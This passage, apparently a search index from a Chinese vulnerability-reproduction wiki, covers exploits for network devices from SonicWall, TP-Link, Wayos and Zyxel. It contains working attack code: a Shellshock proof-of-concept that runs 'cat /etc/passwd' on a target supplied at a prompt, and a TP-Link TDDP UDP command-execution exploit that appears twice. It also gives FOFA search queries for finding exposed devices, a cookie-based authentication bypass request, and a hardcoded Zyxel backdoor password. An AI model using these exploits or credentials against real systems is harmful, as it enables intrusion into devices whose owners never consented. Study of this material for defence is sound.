\" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/cgi-bin/jarrewrite.sh\" headers = { \"User-Agent\" : \"() { :; }; echo ; /bin/bash -c ' %s '\" % ( cmd )} try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () cmd = 'cat /etc/passwd' target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url , cmd )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d SonicWall_SSL_VPN_RCE.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/SonicWall/SonicWall%20SSL-VPN%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/TP-Link/TP-Link%20SR20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"TP-Link SR20 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u636e\u5916\u5a92\u62a5\u9053\uff0c\u8457\u540d\u5b89\u5168\u4e13\u5bb6\u3001Google \u5b89\u5168\u5de5\u7a0b\u5e08Matthew Garrett\u516c\u5f00\u4e86TP-LINK SR20\u667a\u80fd\u5bb6\u5c45\u8def\u7531\u5668\u4e00\u4e2a\u201c\u5141\u8bb8\u6765\u81ea\u672c\u5730\u7f51\u7edc\u8fde\u63a5\u7684\u4efb\u610f\u547d\u4ee4\u6267\u884c\u201d\u7684\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u63a7\u5236\u7528\u6237\u8def\u7531\u5668\uff0c\u501f\u6b64\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u5371\u53ca\u7528\u6237\u9690\u79c1\u5b89\u5168\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] TP-Link SR20 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \" %0.16X \" % 00 tddp_packet = \"\" . join ([ tddp_ver , tddp_command , tddp_req , tddp_reply , tddp_padding ]) sock_receive = socket . socket ( socket . AF_INET , socket . SOCK_DGRAM ) sock_receive . bind (( '' , port_receive )) # Send a request sock_send = socket . socket ( socket . AF_INET , socket . SOCK_DGRAM ) packet = binascii . unhexlify ( tddp_packet ) packet = packet + b \"/testfile;arbitrary\" print ( packet ) sock_send . sendto ( packet , ( \"192.168.0.1\" , port_send )) sock_send . close () response , addr = sock_receive . recvfrom ( 1024 ) r = response . encode ( 'hex' ) print ( r )","title":"TP-Link SR20 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/TP-Link/TP-Link%20SR20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#tp-link-sr20-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":"","title":"TP-Link SR20 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/TP-Link/TP-Link%20SR20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u636e\u5916\u5a92\u62a5\u9053\uff0c\u8457\u540d\u5b89\u5168\u4e13\u5bb6\u3001Google \u5b89\u5168\u5de5\u7a0b\u5e08Matthew Garrett\u516c\u5f00\u4e86TP-LINK SR20\u667a\u80fd\u5bb6\u5c45\u8def\u7531\u5668\u4e00\u4e2a\u201c\u5141\u8bb8\u6765\u81ea\u672c\u5730\u7f51\u7edc\u8fde\u63a5\u7684\u4efb\u610f\u547d\u4ee4\u6267\u884c\u201d\u7684\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u63a7\u5236\u7528\u6237\u8def\u7531\u5668\uff0c\u501f\u6b64\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u5371\u53ca\u7528\u6237\u9690\u79c1\u5b89\u5168\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/TP-Link/TP-Link%20SR20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] TP-Link SR20","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/TP-Link/TP-Link%20SR20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \" %0.16X \" % 00 tddp_packet = \"\" . join ([ tddp_ver , tddp_command , tddp_req , tddp_reply , tddp_padding ]) sock_receive = socket . socket ( socket . AF_INET , socket . SOCK_DGRAM ) sock_receive . bind (( '' , port_receive )) # Send a request sock_send = socket . socket ( socket . AF_INET , socket . SOCK_DGRAM ) packet = binascii . unhexlify ( tddp_packet ) packet = packet + b \"/testfile;arbitrary\" print ( packet ) sock_send . sendto ( packet , ( \"192.168.0.1\" , port_send )) sock_send . close () response , addr = sock_receive . recvfrom ( 1024 ) r = response . encode ( 'hex' ) print ( r )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/WayOS/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%20CNVD-2021-00876/","text":"Wayos AC\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u5f31\u53e3\u4ee4 CNVD-2021-00876 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6df1\u5733\u7ef4\u76df\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u662f\u56fd\u5185\u9886\u5148\u7684\u7f51\u7edc\u8bbe\u5907\u53ca\u667a\u80fd\u5bb6\u5c45\u4ea7\u54c1\u89e3\u51b3\u65b9\u6848\u4f9b\u5e94\u5546\uff0c\u4e3b\u8425\u4ea7\u54c1\u5305\u62ec\u65e0\u7ebf\u7f51\u5173\u3001\u4ea4\u6362\u673a\u3001\u56fd\u5916VPN\u3001\u53cc\u9891\u5438\u9876ap\u7b49\u3002 AC\u96c6\u4e2d\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u5f31\u53e3\u4ee4\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] AC\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf FOFA \u00b6 [!NOTE] title=\"AC\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u9ed8\u8ba4\u5f31\u53e3\u4ee4\u4e3a admin:admin Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Wayos_AC_Centralized_management_system_Default_weak_password","title":"Wayos AC\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u5f31\u53e3\u4ee4 CNVD-2021-00876"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/WayOS/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%20CNVD-2021-00876/#wayos-ac\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u5f31\u53e3\u4ee4--cnvd-2021-00876","text":"","title":"Wayos AC\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf\u9ed8\u8ba4\u5f31\u53e3\u4ee4  CNVD-2021-00876"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/WayOS/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%20CNVD-2021-00876/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6df1\u5733\u7ef4\u76df\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8\u662f\u56fd\u5185\u9886\u5148\u7684\u7f51\u7edc\u8bbe\u5907\u53ca\u667a\u80fd\u5bb6\u5c45\u4ea7\u54c1\u89e3\u51b3\u65b9\u6848\u4f9b\u5e94\u5546\uff0c\u4e3b\u8425\u4ea7\u54c1\u5305\u62ec\u65e0\u7ebf\u7f51\u5173\u3001\u4ea4\u6362\u673a\u3001\u56fd\u5916VPN\u3001\u53cc\u9891\u5438\u9876ap\u7b49\u3002 AC\u96c6\u4e2d\u7ba1\u7406\u5e73\u53f0\u5b58\u5728\u5f31\u53e3\u4ee4\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/WayOS/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%20CNVD-2021-00876/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] AC\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/WayOS/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%20CNVD-2021-00876/#fofa","text":"[!NOTE] title=\"AC\u96c6\u4e2d\u7ba1\u7406\u7cfb\u7edf\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/WayOS/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%20CNVD-2021-00876/#\u6f0f\u6d1e\u590d\u73b0","text":"\u9ed8\u8ba4\u5f31\u53e3\u4ee4\u4e3a admin:admin","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/WayOS/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4%20CNVD-2021-00876/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Wayos_AC_Centralized_management_system_Default_weak_password","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20NBG2105%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20CVE-2021-3297/","text":"Zyxel NBG2105 \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 CVE-2021-3297 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Zyxel NBG2105 \u5b58\u5728\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u66f4\u6539 login\u53c2\u6570\u53ef\u7528\u5b9e\u73b0\u540e\u53f0\u767b\u9646 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Zyxel NBG2105 FOFA \u00b6 [!NOTE] app=\"ZyXEL-NBG2105\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u5176\u4e2d\u524d\u7aef\u6587\u4ef6 /js/util_gw.js \u5b58\u5728\u524d\u7aef\u5bf9 Cookie login\u53c2\u6570\u7684\u6821\u9a8c \u53ef\u4ee5\u770b\u5230\u68c0\u6d4b\u5230 Cookie\u4e2d\u7684 login=1 \u5219\u8df3\u8f6c home.html function setCookie() //login_ok.htm use { document.cookie=\"login=1\"; MM_goToURL('parent', 'home.htm'); } \u8bf7\u6c42\u5982\u4e0b\u5219\u4f1a\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8df3\u8f6c\u5230 home.htm\u9875\u9762 http://xxx.xxx.xxx.xxx/login_ok.htm Cookie: login=1; \u53c2\u8003\u6587\u7ae0 \u00b6 https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass","title":"Zyxel NBG2105 \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 CVE-2021-3297"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20NBG2105%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20CVE-2021-3297/#zyxel-nbg2105-\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7-cve-2021-3297","text":"","title":"Zyxel NBG2105 \u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 CVE-2021-3297"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20NBG2105%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20CVE-2021-3297/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Zyxel NBG2105 \u5b58\u5728\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u66f4\u6539 login\u53c2\u6570\u53ef\u7528\u5b9e\u73b0\u540e\u53f0\u767b\u9646","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20NBG2105%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20CVE-2021-3297/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Zyxel NBG2105","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20NBG2105%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20CVE-2021-3297/#fofa","text":"[!NOTE] app=\"ZyXEL-NBG2105\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20NBG2105%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20CVE-2021-3297/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u5176\u4e2d\u524d\u7aef\u6587\u4ef6 /js/util_gw.js \u5b58\u5728\u524d\u7aef\u5bf9 Cookie login\u53c2\u6570\u7684\u6821\u9a8c \u53ef\u4ee5\u770b\u5230\u68c0\u6d4b\u5230 Cookie\u4e2d\u7684 login=1 \u5219\u8df3\u8f6c home.html function setCookie() //login_ok.htm use { document.cookie=\"login=1\"; MM_goToURL('parent', 'home.htm'); } \u8bf7\u6c42\u5982\u4e0b\u5219\u4f1a\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u8df3\u8f6c\u5230 home.htm\u9875\u9762 http://xxx.xxx.xxx.xxx/login_ok.htm Cookie: login=1;","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20NBG2105%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20CVE-2021-3297/#\u53c2\u8003\u6587\u7ae0","text":"https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E%20CVE-2020-29583/","text":"Zyxel \u786c\u7f16\u7801\u540e\u95e8\u8d26\u6237\u6f0f\u6d1e CVE-2020-29583 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Zyxel\u56fa\u4ef6\u4e2d\u53d1\u73b0\u7684\u540e\u95e8\u88ab\u79f0\u4e3a\u5173\u952e\u56fa\u4ef6\u6f0f\u6d1e\uff0cCVE\u7f16\u53f7CVE-2020-29583\uff0c\u5f97\u5206\u4e3a7.8 CVSS\u3002\u867d\u7136CVSS\u8bc4\u5206\u770b\u4f3c\u4e0d\u662f\u5f88\u9ad8\uff0c\u4f46\u5374\u4e0d\u53ef\u5c0f\u89d1\u3002\u7814\u7a76\u4eba\u5458\u8868\u793a\uff0c\u8fd9\u662f\u4e00\u4e2a\u6781\u4e3a\u4e25\u91cd\u7684\u6f0f\u6d1e\uff0c\u6240\u6709\u8005\u5fc5\u987b\u7acb\u5373\u66f4\u65b0\u5176\u7cfb\u7edf\u3002\u56e0\u4e3a\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8f7b\u677e\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u4eceDDoS\u50f5\u5c38\u7f51\u7edc\u8fd0\u8425\u5546\u5230\u52d2\u7d22\u8f6f\u4ef6\u56e2\u4f53\u548c\u653f\u5e9c\u8d44\u52a9\u7684\u9ed1\u5ba2\u3002 \u901a\u8fc7\u6ee5\u7528\u540e\u95e8\u8d26\u6237\uff0c\u7f51\u7edc\u7f6a\u72af\u53ef\u4ee5\u8bbf\u95ee\u6613\u53d7\u653b\u51fb\u7684\u8bbe\u5907\u5e76\u611f\u67d3\u5185\u90e8\u7f51\u7edc\u4ee5\u53d1\u8d77\u5176\u4ed6\u653b\u51fb\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7ba1\u7406\u7279\u6743\u767b\u5f55\u8bbe\u5907\uff0c\u5e76\u8f7b\u6613\u7834\u574f\u7f51\u7edc\u8bbe\u5907\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Zyxel USG\u7cfb\u5217 Zyxel ATP\u7cfb\u5217 Zyxel NCX\u7cfb\u5217 Zyxel USG FIEX\u7cfb\u5217 Zyxel VPN\u7cfb\u5217 FOFA \u00b6 [!NOTE] title=\"USG40\" \"NXC2500\" \u7b49 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5206\u6790\u56fa\u4ef6\u4e2d\u6709 FTP \u7684\u540e\u95e8\u5bc6\u7801 \u4f7f\u7528 \u6f0f\u6d1e\u626b\u63cf\u811a\u672c \u627e\u5230\u6613\u53d7\u653b\u51fb\u7684\u7248\u672c \u8fdb\u884c\u653b\u51fb\uff0c\u767b\u5f55\u4e3a\u540e\u95e8\u7ba1\u7406\u5458\u8d26\u6237 zyfwp:PrOw!aN_fXp \u8fd9\u91cc\u4f7f\u7528Goby\u8bbe\u7f6e\u5b57\u5178\u626b\u63cf\u5373\u53ef \u53c2\u8003\u6587\u7ae0 \u00b6 scan_CVE-2020-29583 Zyxel USG Series \u8d26\u6237\u786c\u7f16\u7801\u6f0f\u6d1e\uff08CVE-2020-29583\uff09","title":"Zyxel \u786c\u7f16\u7801\u540e\u95e8\u8d26\u6237\u6f0f\u6d1e CVE-2020-29583"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E%20CVE-2020-29583/#zyxel-\u786c\u7f16\u7801\u540e\u95e8\u8d26\u6237\u6f0f\u6d1e-cve-2020-29583","text":"","title":"Zyxel \u786c\u7f16\u7801\u540e\u95e8\u8d26\u6237\u6f0f\u6d1e CVE-2020-29583"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E%20CVE-2020-29583/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Zyxel\u56fa\u4ef6\u4e2d\u53d1\u73b0\u7684\u540e\u95e8\u88ab\u79f0\u4e3a\u5173\u952e\u56fa\u4ef6\u6f0f\u6d1e\uff0cCVE\u7f16\u53f7CVE-2020-29583\uff0c\u5f97\u5206\u4e3a7.8 CVSS\u3002\u867d\u7136CVSS\u8bc4\u5206\u770b\u4f3c\u4e0d\u662f\u5f88\u9ad8\uff0c\u4f46\u5374\u4e0d\u53ef\u5c0f\u89d1\u3002\u7814\u7a76\u4eba\u5458\u8868\u793a\uff0c\u8fd9\u662f\u4e00\u4e2a\u6781\u4e3a\u4e25\u91cd\u7684\u6f0f\u6d1e\uff0c\u6240\u6709\u8005\u5fc5\u987b\u7acb\u5373\u66f4\u65b0\u5176\u7cfb\u7edf\u3002\u56e0\u4e3a\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8f7b\u677e\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u4eceDDoS\u50f5\u5c38\u7f51\u7edc\u8fd0\u8425\u5546\u5230\u52d2\u7d22\u8f6f\u4ef6\u56e2\u4f53\u548c\u653f\u5e9c\u8d44\u52a9\u7684\u9ed1\u5ba2\u3002 \u901a\u8fc7\u6ee5\u7528\u540e\u95e8\u8d26\u6237\uff0c\u7f51\u7edc\u7f6a\u72af\u53ef\u4ee5\u8bbf\u95ee\u6613\u53d7\u653b\u51fb\u7684\u8bbe\u5907\u5e76\u611f\u67d3\u5185\u90e8\u7f51\u7edc\u4ee5\u53d1\u8d77\u5176\u4ed6\u653b\u51fb\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7ba1\u7406\u7279\u6743\u767b\u5f55\u8bbe\u5907\uff0c\u5e76\u8f7b\u6613\u7834\u574f\u7f51\u7edc\u8bbe\u5907\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E%20CVE-2020-29583/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Zyxel USG\u7cfb\u5217 Zyxel ATP\u7cfb\u5217 Zyxel NCX\u7cfb\u5217 Zyxel USG FIEX\u7cfb\u5217 Zyxel VPN\u7cfb\u5217","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E%20CVE-2020-29583/#fofa","text":"[!NOTE] title=\"USG40\" \"NXC2500\" \u7b49","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E%20CVE-2020-29583/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5206\u6790\u56fa\u4ef6\u4e2d\u6709 FTP \u7684\u540e\u95e8\u5bc6\u7801 \u4f7f\u7528 \u6f0f\u6d1e\u626b\u63cf\u811a\u672c \u627e\u5230\u6613\u53d7\u653b\u51fb\u7684\u7248\u672c 